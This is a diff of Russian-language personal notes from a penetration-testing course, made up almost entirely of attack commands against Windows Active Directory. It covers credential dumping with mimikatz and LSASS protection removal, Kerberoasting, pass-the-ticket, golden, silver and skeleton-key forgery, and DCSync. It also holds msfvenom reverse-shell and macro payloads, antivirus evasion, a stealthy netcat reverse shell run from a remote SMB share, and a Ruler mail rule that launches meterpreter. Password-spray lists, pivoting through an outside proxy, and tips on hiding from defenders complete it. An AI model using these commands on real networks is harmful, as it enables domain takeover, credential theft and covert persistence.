@@ -477,7 +477,7 @@ cd impacket/examples
 
 RCE по протоклам DCE RPC
 $ pyhton atexec.py ignite/Administrator:Qq123@192.168.1.105 systeminfo
-                                     ^домен ^учетка       ^pass ^адрес
+                   ^домен ^учетка       ^pass ^адрес
 
 (445) PsExec
 $ python psexec.py ignite/Administrator:Qq123@192.168.1.105
@@ -544,6 +544,7 @@ kiwi
 
 Group Policy
 \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\		Хранилище груповых политик
+$ use post/windows/gather/credentials/gpp	Вытащить груповые политики после эксплуатации 
 
 
 
@@ -733,16 +734,26 @@ AS Rep Roasting/impacket
 $ python impacket/examples/GetNPUsers.py CONTOSO.COM/Administrator:'P@ssw0rd' -request
 В результатен получаем имя пользователя, у которого отключена preauth и его билет
 
+Реальный пример
+$ GetNPUsers.py <domain.local>/<WIN7\$> -hashes <hash> -request -dc-ip <domain controller id> 
+
 
 
 Kerberoasting/impacket (90%)
 $ impacket/examples/GetUserSPNs.py -request -dc -ip 10.10.10.100 active.htb/svs tgs
+
+Реальный пример
+$ GetUserSPNs.py <domain.local>/<WIN7\$> -hashes <hash> -request -dc-ip <192.168.1.80>
+		  домен          машина, экранируем $                    ip домен-контроллера
+
 
 
 
 Брутаем полученные билеты
 $ hashcat -m 18200 <ASRepfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для AS rep Roasting
 $ hashcat -m 13100 <Kerbfile> -o <outfile> /usr/share/wordlists/rockyou.txt --force	для Kerberoasting
+
+$ john --format=krb5asrep --wordlist=<rockyou.txt> <Kerbfile>				на практике работает стабильнее
 
 
 
@@ -754,23 +765,38 @@ $ carckmapexec smb 192.168.1.0/24		Сканируем адреса на smb по
 
 Занятие 6
 
-Responder (очень важный инструмент)
+Responder (очень важный инструмент, атака на LLMNR)
 https://github.com/SpiderLabs/Responder
-$ responder -I eth0 -w -r -f -F -v -v -vv 
-Атака не деструктивная, но может собрать много хешей с домена
+$ responder -I eth0 -w -r -f -F -v -v -vv
 
-$ hashcat -m 5600 hash -o hash.out /usr/share/wordlists/rockyou.txt
+$ responder -I eth0 -w -r -f -F -v -v -vv -b	Включили basic authentication (фишинговое окно при посещении доменных ресурсов)
+Теперь ждем, пока пользователь пойдет на несуществующий доменный ресурс 
+
+/etc/Responder/Responder.conf
+	Challenge = random 			Можно поставить свой челендж, что бы успорить брутфорс
+
+
+Атака не деструктивная, но может собрать много NTLM хешей с домена
 
 
 
-LSASS
+Брут полученных хешей
+$ hashcat -m 5600 <file with hash> -o hash.out /usr/share/wordlists/rockyou.txt
+$ cat hash.out
+
+
 
 Mimikatz
+
+https://github.com/gentilkiwi/mimikatz
+Вытаскиваем хеши и пароли из LSASS
 Перед использованием нужно отключить антивирус
 
 Вытащить все креды
-mimikatz # privilege::debug			
-mimikatz # sekurlsa::logonPasswords full	
+mimikatz # coffee				Проверить, что инструмент работает
+mimikatz # privilege::debug			Работает только от привелигерованного пользователя
+mimikatz # standard::log log.txt		Записываем лог файл
+mimikatz # sekurlsa::logonPasswords full	Вытаскиваем данные из памяти процесса
 
 Для XP, 2000 используем Mimilove
 
@@ -785,12 +811,53 @@ msf6> run
 Готовим пейлоад
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=7777 -f exe -o meter.exe	
 
-Поднимаем smb шару с пейлоадом
+Поднимаем smb шару в папке с пейлоадом
 $ sudo python3 impacket/examples/smbserver.py kek .	
 
-meterpreter> getuid
-meterpreter> getsystem
-meterpreter> run post/windows/gather/smart_hashdump
+
+
+meterpreter> getuid					Узнать пользователя, под которым мы работаем
+meterpreter> getsystem					Имперсонируем токен системы
+meterpreter> run post/windows/gather/smart_hashdump	Если ни kiwi ни hashdump не отработали
+
+
+
+Способ пробиться к учеткам при защищенной памяти LSASS
+(Ошибка ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005))
+
+meterpreter> upload mimikatz.exe
+meterpreter> upload mimidrv.sys
+meterpreter> shell
+C:\>mimikatz.exe
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # sekurlsa::logonPasswords full
+
+
+
+Мануал по mimikatz
+https://github.com/insi2304/Mimikatz-cheatsheet
+
+
+
+Анализ памяти на своей машине
+meterpreter> upload procdump64.exe
+meterpreter> shell
+c:\> procdump64.exe -ma lsass.exe dump -accepteula
+meterpreter> download dump.dmp
+
+На своей винде
+mimikatz # sekurlsa::Minidump dump.dmp
+mimikatz # sekurlsa::logonPasswords full
+
+На своем линуксе
+$ pypykatz lsa -t 0 minidump dump.dmp
+
+
+
+Подсказка к последнему шагу цепочки из дз
+meterpreter> impersonate_token "INFOSEC\admin"
+C:\> type \\onfosec.local\C$\flag.txt
 
 
 
@@ -799,85 +866,153 @@ meterpreter> run post/windows/gather/smart_hashdump
 Зантятие 7
 
 Pass the Ticket
-meterpreter> kerberos_ticket_list		Список kerberos билетов
 
+Список kerberos билетов
+meterpreter> kerberos_ticket_list		
+
+В памяти LSASS хранятся не только парол, но  билеты
+
+Структура билета
+[0;1d0bb]-2-0-40e10000-<username>@<service>-<domain.local>.kirbi
 
 
 Pass the Ticket (Windows)
-Mimikatz:
-> mimikatz.exe
-# privilege::debug
-# token::elevate
-# sekurlsa::tickets/export
+
+На жертве
+C:\> mimikatz.exe
+# privilege::debug					
+# token::elevate					Повышаем првлег, что бы увидеть остальные билеты, существующие в системе
+# sekurlsa::tickets/export				Экспортруем билеты
 # exit
-> dir | findet "Administrator" | findstr "krbtgt"
+C:\> dir | findet "Administrator" | findstr "krbtgt"	Сортруем блеты с юзером - Administrator и сервисом krbtgt
 [0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi
 
-> mimikatz.exe
+На своей винде
+C:\> mimikatz.exe
 # privilege::debug
-# kerberos::ppt [0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi
+# kerberos::ppt <[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB>.kirbi
 File: '[0;1d0bb]-2-0-40e10000-Administrator@krbtgt-HACKER.TESTLAB.kirbi': OK
 # exit
+
+Что бы не было ошибок соединения, нужно прописать DNS контроллера домена в настройках адаптера
 
 
 
 Pass the Ticket (Linux)
-meterpreter> kiwi_cmd "\"sekurlsa::ticket/export\""
+meterpreter> kiwi_cmd "\"sekurlsa::ticket /export\""				Старый формат команды
+meterpreter> kiwi_cmd "privilege::debug"
+meterpreter> kiwi_cmd "sekurlas::ticket/export"					Новый формат команды
+
+Если возникают проблемы, загружаем mimikatz
+mimikatz # privilege::debug 
+mimikatz # sekurlsa::ticket/export						Билеты появятся в теущей директории
+mimikatz # exit
+meterpreter> download *								В названии файлов много спецсимволов
 
 https://github.com/Zer1t0/ticket_converter
-$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache
+В первую очередь берем krbtgt билеты Administrator
+$ python ticket_converter.py <ticket>.kirbi <ticket>.ccache			Конвертируем блет в ccache
 Converting kirbi => ccache
-$ export KRB5CCNAME=/home/user/velociraptor.ccache
-$ psexec.py -k -no-pass Server01.domain.local n		
+$ export KRB5CCNAME=/home/user/velociraptor.ccache				Экспортируем билет в переменную
+$ psexec.py -k -no-pass <Administrator>@<WIN7>.<DOMAIN.local> dc-ip <192.168.1.80>						
+
+Ошибки
+[Errno -2] Name or service not known
+Добавить адрес контроллера в /etc/hosts
+	<192.168.1.80>	<DOMAIN.local>
+
+KRB_AP_ERR_TKT_EXPIRED(Ticket expired)
+Нужно синхронизировать время с домен-контроллером
+	$ apt install rdate
+	sudo rdate -n <192.168.1.80>
 
 
 
 Overpass the Hash (Windows)
-> mimikatz.exe	
+C:\> mimikatz.exe	
 # privilege::debug
-# sekurlsa::logonpasswords
-# sekurlsa::pth /user:duff/domain:jessybrings.com/ntlm:{ntlm hash we grabed}
+# sekurlsa::ekeys								Вытаскиваем ключи для машинной записи
+Для запроса билета по DES требуется только NTLM хэш 				(des_cbc_md5)
+# sekurlsa::logonpasswords							Вытаскваем NTLM хеши пользователя
+# sekurlsa::pth /user:<user> /domain:<jessybrings.com> /ntlm:<ntlm hash>	Используем NTLM хеш 
+# sekurlsa::pth /user:<user> /domain:<jessybrings.com> /aes:<aes key>		Если хотм пойти по aes256_hmac
 Билет добавится в память процесса lsass
 
-Команда из чата (вроде запуск логина с кербероса)
+Запуск RDP по керебросу
 mimikatz # sekurlsa::pth /user:invader /domain:LOCALHOST /ntlm:NTLM /run:"mstsc /v:10.0.0.2"
 
 
+
 Overpass the Hash (Linux)
-$ python impacket/examples/getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
-$ python getTGT.py <domain_name>/<username> -aesKey <aes_key>
+$ cd impacket/examples
+$ python getTGT.py <domain.local>/<Administrator> -hashes [lm_hash]:<ntlm_hash>		Идем по NTLM
+$ python getTGT.py <domain.local>/<Administrator> -aesKey <aes_hmac>			Или идем по AES (более незаметно)
+$ export KRB5CCNAME=<TGT_ccache_file>
+
+Теперь можем выполнить команду разными способами
+$ python psexec.py -k -no-pass <Administrator>@<WIN7>.<domain.local> -target-ip <192.168.1.81>
+$ python smbexec.py -k -no-pass <domain_name>/<user_name>@<remote_hostname> 
+$ python wmiexec.py -k -no-pass <domain_name>/<user_name>@<remote_hostname> 
 
 
 
-dcsync
-$ python impacket/examples/secretsdump.py -hashes <hash> DOMAIN/den.adm:pass@192.168.0.6 -ntds NTDS -outputfile DUMP
+dcsync (hashdump на ДоменКонтроллере)
+
+На Windows
+mimikatz # lsadump::dcsync /domain:<rd.security.org> /user:<Administrator>
+Нужно вытаскивать данные для каждого пользователя по отдельности
+
+На Linux
+$ cd impacket/examples
+$ python secretsdump.py -hashes :<hash> Administrator@192.168.0.6 -ntds NTDS -outputfile DUMP
 Заодно вытягиваем историю паролей
+
+$ pythin secretsdump.py -hashes :<hash> Administrator@192.168.1.80 -just-dc-user krbtgt		
+Вытаскваем только креды krbtgt. Если получилось, это полный захват домена
+
+Если есть возможность использовать AES-256, всегда лучше использовать его а не DES
 
 
 
 Golden Ticket
-Требует получения доступа к krbtgt
-$ python impacket/examples/lookupsid.py DOMAIN/user:pass@192.168.1.1 -hashes <hash>	Получаем sid
+Требует получения прав доменного Админа и получения доступа к krbtgt
+
+Узнаем sid
+$ cd impacket/examples
+$ python lookupsid.py <DOMAIN.local>/Administrator@192.168.1.80 -hashes :<hash>	Получаем sid
 S-1-5-21-450836121-1649635954-203960036
-> mimikatz
-# kerberos::golden /krbtgt:<hash> /admin:administrator /domain:demo.local /sid:S-1-5-21-4508... /ticket:administrator.ticket.bin
 
-$ ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> -dc-ip <ip> <username>
+Генерируем Golden ticket на Windows
+C:> mimikatz
+# kerberos::golden /krbtgt:<hash> /admin:administrator /domain:demo.local /sid:<S-1-5-21-4508...> /ticket:administrator.ticket.bin
+
+Генерируем Golden ticket на Linux 
+$ python ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain.local> -dc-ip <192.168.1.80> <pentest>			По NTLM (:вторая половина хеша:::)
+$ python ticketer.py -aesKey <aes256_hmac> -domain-sid <sid> -domain <domain.local> -dc-ip 192.168.1.80	<pentest>		По AES
 $ export KRB5CCNAME=<ip>.ccache
-$ psexec.py -k -no-pass Administrator@<domain> -target-ip <ip> 
+$ psexec.py -k -no-pass <pentest>@<WIN10>.<domain> -target-ip <192.168.1.81> 
 
-Можно создать несуществующего пользователя, что собьет с толку админов
+Можно создать несуществующего пользователя, что собьет с толку админов.
 Можно создать вечный билет, который будет работать хоть через 10 лет. 
-
 Пофиксить это можно только сменой krbtgt пароля два раза, однако в таком случае будет окно в 8 часов, что бы забрать новый пароль и сделать новый Golden Ticket
 В таком случае выкурить злоумышленника будет невозможно. Более того, процедура смены пароля достаточно опасная 
 
 
 
 Silver Ticket
+Имея рабочую учетку, без прав локального админа мы можем подделать билет и указать там более высокие права
 Максимум на месяц
 
+$ cd impacket/examples
+$ python ticketer.py -nthash <hash> -domain-sid <sid> -domain <DOMAIN.local> -spn <service_spn> <pentest>
+CIFS/<username>/domain.local	вставляем так, если что impacket подправит сам
+$ python ticketer.py -aesKey <aes_key> -domain-sid <sid> -domain <DOMAIN.local> -spn <CIFS/WIN7.domain.local> <pentest>
+$ export KRB5CCNAME=<pentest.ccache>
 
+Теперь можем выполнить команду разными способами
+$ python psexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
+$ python smbexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
+$ python wmiexec.py -k -no-pass <pentest>@<win7>.<domain.local> -target-ip <192.168.1.81>
 
 
 
@@ -897,3 +1032,441 @@ https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/
 https://github.com/rasta-mouse/Sherlock
 https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194
 https://pentestlab.blog/tag/local-exploits/ 
+
+
+
+Атаки на домен(95%)
+
+msf6> use auxiliary/scanner/smb/pipe_auditor				Чекаем все пайпы
+
+
+PIPE Samr
+Вывести список доменных пользователей 
+$ sudo rpcclient -N 192.168.1.65 -U "" 
+rpcclient $> enumdomusers
+
+
+
+Enum Домена
+https://github.com/m8r0wn/nullinux
+$ python3 nullinux <ip>
+
+или 
+$ enum4linux <ip>
+Если 
+[+] Password Info for Domain:
+	..
+	[+] Account Lockout Threshhold: <None>/<5>				Смотрим, стоит ли ограничение на число неудачных попыток входа
+	[+] Reset Account Lockout Counter: <30>/<Never>				Время до сброса числа неудачных входов	(Never - очень опасно)				
+
+
+
+Password spraying
+Идем с одним паролем сразу на все учетки
+
+Vfhn2021		На раскладке Март2021
+Vfhn2021!		Такая же логика
+Atdhfkm2021
+Atdhfkm2021!
+P@ssw0rd
+Aa12345678		Тоже очень частый пароль
+1qaz@WSX		Частый геометрический пароль  
+!QAZ2wsx
+
+
+
+Брут
+$ crackmapexec smb <ip> -u <словарь с логинами> -p <P@ssw0rd@1> <!QAZ2wsx> --continue-on-success
+$ hydra -L <user.txt> -p Password@1 <id> smb						Но, в отличии от прошлого варианта, не отображает, что учетки начали лочиться
+msf6> smb/smb_login
+$ patator smb_login host=<ip> user=FILE0 0=<file> password=Password@1
+
+Пароль доменного администратора никогда не лочится => брутаем сколько хотим
+
+
+
+https://github.com/samratashok/ADModule
+
+
+
+PowerView
+https://github.com/PowerShellMafia/PowerSploit
+
+
+
+CRTP - индусский курс по powershell. Есть много сливов в телеге
+на pentester academy
+
+
+
+wc -l <file>		Подсчитать кол-во строк в файле
+
+
+
+
+
+Занятие 9
+
+hashdump - вытаскивает все локальные учетки
+
+
+
+Get-NetLoggedon - пользователи, залогиненные на компьютере
+
+Find-LocalAdminAccess -Verbose - список машин и доступ к ним
+
+Invoke-UserHunter
+
+
+
+Bloodhound (Linux Domain enumeration)
+https://github.com/BloodHoundAD/BloodHound
+
+Default - local admins, group members, domain trusts, sessions
+Group - group membership
+LocalGroup - local admins
+GPOLocalGroup - 
+ComputerOnly - local admin, session
+Sessions - user sessioin
+LoggedOn - 
+
+Collectors для bloodhound необходимо скачивать заново (часто обновляются)
+
+
+
+ADiDNSDump
+https://github.com/dirkjanm/adidnsdump
+$ adidnsdump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65
+
+
+
+Ldapdomaindump		Собирает информацию о домене и представляет ее в красивом виде
+https://github.com/dirkjanm/ldapdomaindump
+$ python3 setup.py install
+$ ldapdomaindump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65
+
+
+post/widows/gather/credetials/gpp
+
+Михаил Нащекин (Mikhail Naschekin) - работает в positive technologies
+
+
+
+
+
+Занятие 10
+
+Antivirus Bypass
+
+
+
+Payload через макросы
+$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f vba
+Документ -> Macro -> create
+msf6> use exploit/multi/handler
+
+
+Просмотр рабочего стола по vnc
+msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -o malware.exe
+
+
+
+Список енкодеров для нагрузки
+$ msfvenom --list encoders		Список енкодеров
+$ msfvenom -i				Кол-во иттераций енкодера
+
+-e x86/alpha
+
+
+Закодированный vnc шелл (не сильно помогает)
+msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -e x86/shikata_ga_nai -o encmalware.exe
+
+
+
+##### НЕ БЫТЬ ВИРУСОМ #####
+В Kali есть легитимные виндовые бинарники
+/usr/share/windows-resources/binaries
+
+
+Беспалевный reverse shell
+
+Поднимаем шару
+$ sudo impacket/examples/smbserver.py <smbname> . -smbsupport
+
+Ловим подключение
+$ nc -nvlp <port>
+
+Записываем в батник и отдаем жертве на запуск
+%COMSPEC% /b /c start /b /min \\<share ip>\<smbname>\nc.exe <nc ip> <nc port> -e cmd.exe
+
+
+$ impacket/examples/wmiexec.py -h .Admin:Pa$$w0rd@<target ip> 
+
+
+Утилита для скрытного подключения
+https://github.com/besimorhino/powercat
+
+
+PS c:\> powercat -с <ip>
+
+
+Powershell обфускация (новые появляются постоянно, проще загуглить)
+Если использовать несколько разных обфускаторов, то надежность больше
+https://github.com/danielbohannon/Invoke-Obfuscation
+https://github.com/CBHue/PyFuscation
+https://github.com/
+https://github.com/
+
+
+
+##### БЫТЬ НЕОЖИДАННЫМ #####
+
+Используем редкие языки
+
+<скрипт из презентации на GO>
+
+
+
+Veil 
+https://github.com/Veil-Framework/Veil-Evasion
+cd Veil-Evasion
+cd setup
+setup.sh -c
+
+OR 
+docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil
+
+
+find . -name *.bat
+
+
+
+
+
+Занятие 11)
+
+Линукс может быть интегрирован в домен (линукс знает, как работать с доменом, но домен не умеет работать с линуксом)
+/etc/krb5
+
+
+
+NTLM Relay
+
+Обращение по: 
+NTLM - ip адреса
+Kerberos - имена
+
+
+
+Атака
+$ crackmpexec smb 192.168.1.0/24				Ищем цели с signing:False
+В среднем можно подключиться к 5 серверам с одной машины
+$ сrackmapexec smb <ip>/<mask> --gen-relay-list targets.txt	Создаем список из клиента и пачки серверов, на которых хотим авторизоваться
+/etc/Responder/Responder.conf
+	
+	
+$ responder -I eth0 -r -d -w					
+$ ntlmrelayx.py -tf targets.txt -c "COMMAND"
+
+
+NET NTLM:
+1) NTLM negotiate
+	указание клиентом своих возможностей
+2) 
+
+
+
+Будучи никем получаем доменную учетку
+sudo ntlmrelayx.py -t ldaps://<ip> --no-dump --no-da --n-acl --no-validate-privs --add-computer <pentest> -h
+
+crackmapexec smb 192.168.1.85 -u SQLSRV\$ -H 0d93f4fb9cbb58907137d6af7ff37b91
+
+
+
+
+
+Занятие 12
+
+хинт мб 70 машина с анонимным ftp
+с доменной учеткой можно делать керберостинг, асрепростинг, ремов мик,
+
+Сканируем максимально широко!
+
+
+
+Достижение цели
+
+Ищем машины с двумя интерфейсами
+$ crackmapexec smb <ip>/24 -u Administrator -H <hash> -x "ipconfig"
+$ crackmapexec smb <ip>/24 -u Administrator -H <hash> -x "netstat "
+
+
+
+Обход сегментации сети
+
+Gost
+https://github.com/ginuerzh/gost
+https://docs.ginuerzh.xyz/gost/en/	Wiki
+
+На 192.168.1.1
+gost.exe -L socks5://:8081
+На kali
+./gost -L socks5://:8080 -F socks5://192.168.1.1:8081
+
+msf6> set proxies
+
+Более длинная цепочка
+gost -L=socks5://:8080 -F=socks5://192.168.1.1:8081 -F=socks5://192.168.1.2:8082 -F=socks5://192.168.1.3:8083 
+
+
+
+Реальный сценарий (reverse proxy, что бы обойти нат и фаерволл)
+На сервере с белым IP (195.230.102.1)
+$ gost -L socks5://0.0.0.0:1337
+
+На таргет сервере
+$ ./gost -L socks5://127.0.0.1:13338 &
+$ ./gost -L rtcp://0.0.0.0:13381/127.0.0.1:13338 -F socks5://<195.230.102.1>:1337 &
+В proxychains
+socks5 127.0.0.1 13381
+
+Port forwarding
+gost -L=tcp://:2222/192.168.1.1:22
+
+
+
+Proxychains
+https://github.com/haad/proxychains
+
+$ proxychains <msfconsole> 2>/dev/null
+
+
+
+Tsocks (Не очень стабильный, но при сканировании работает в сотни раз быстрее чем proxychains)
+/etc/tsocks.conf
+$ export LD_PRELOAD=libtsocks.so; nmap 192.168.1.1 -sT 	Опция sT нужна что бы работать через прокси
+
+
+
+Доп материалы по пивотингу
+https://book.hacktricks.xyz/tunneling-and-port-forwarding
+https://www.radarhack.com/tutorial/DEFEATING_THE_NETWORK_SECURITY_INFRASTRUCTURE.pdf
+
+Port forward over SOCKS4:
+127.0.0.1:3389 -> 192.168.1.100:3389 over socks 127.0.0.1:9999
+
+socat TCP4-LISTEN:3389, fork
+SOCKS4:127.0.0.1:192.168.1.100:3389, socksport=9999
+
+socks proxy over ssh
+$ ssh -D 31337 user@192.168.1.1
+
+
+
+SCCM 
+
+ZABBIX
+Система мониторинга 
+можно исполнять код на машинах (любые архитектуры)
+https://youtube.com/v=Vw_Av
+
+
+
+RULER
+https://github.com/sensepost/ruler
+youtube.com/watch?v=C07GS4M8BZk
+
+
+mail.ruler.local
+./ruler -k --verbose --email i.ivanov@ruler.local --username i.ivanov --hash 7395bbfcb39adb3ca48c54663201266f add --location '\\198.18.245.13\kek\meter.exe' --trigger "kekpek4" --name maliciousrule4 --send --subject kekpek4
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.18.245.13 LPORT=4567 -f exe -o meter.exe
+sudo smbserver.py kek . -smb2support
+
+
+
+
+Проверяем доменные учетки
+$ crackmapexec smb <any domain machine> -u <uname> -H <hash>
+$ crackmapexec smb <any domain machine>/24 -u <uname> -H <hash>
+
+
+
+Атаки на GPO
+auxiliary/scanner/smb/smb_enum_gpp
+нужно скормить любую доменную учетку
+
+post/windows/gather/credentials/gpp
+
+Через модули cme
+$ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_autologon
+$ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_password
+
+
+
+
+
+Занятие 13
+
+Redteaming не может быть без Blueteam
+
+Purple Team - следит за ходом и дает подсказуи отстающей команде
+
+Задача Red Team - не спалиться синим
+
+Если понимаешь "Ага, тут я мог спалится", то лучше отвлечь внимаение ложным следом
+
+Сценарий:
+звоним в техподдержку, представляемся 
+
+Интерфейс кали можно сделать пожожим на линукс 
+$ kali-undercover
+
+
+
+Сканировать nmap и masscan плохо (легко детектится)
+В крайнем случае сканим один-два порта и максимально тихо
+
+Вместо этого используем LDAP 
+
+Запросы к неживым машинам палятся
+
+Обычно IDS IPS стоят только на доменных машинах, при этом недоменные машины чаще не защищены
+
+Компрометация админ панели VMWare позволяет получить доступ к trunk порту и после скакать по vlan-ам
+
+C:\> takeown /f <file>
+
+Persistent sticky keys
+админ консоль при залипании клавиш
+msf6> search sticky_keys
+
+
+Угон RDP сессии
+C:\> quser		Просмореть список акивных RDP сессий
+C:\> query user		Или так
+C:\> tscon <id>		Угоняем активную сессию
+
+
+
+Pentecter Academy
+GCB 
+Очень хороший и сложный стенд по доменам
+
+
+
+Skeleton Key 
+Добавляем второй пароль, не нарушая работу старого. Нужно сделать на всех контроллерах домена, сбрасывается при перезагрузке
+# mimikatz.exe
+# privilege::debug
+# misc::skeleton
+C:\> net use x: \\dc-01\admin$ /user:jeff mimikatz	Входим по керберосу на учетку с паролем mimikatz, при этом старые парлоли будут работать
+
+
+
+Набор материала по Persistence 
+https://github.com/infosecn1nja/AD-Attack-Defence/blob/master/README.md#persistence
+
+
+лука сафонов 2 лекции по АД
+Книга Windows Internals обязательно прочитать!
+22:03 23.04.2021
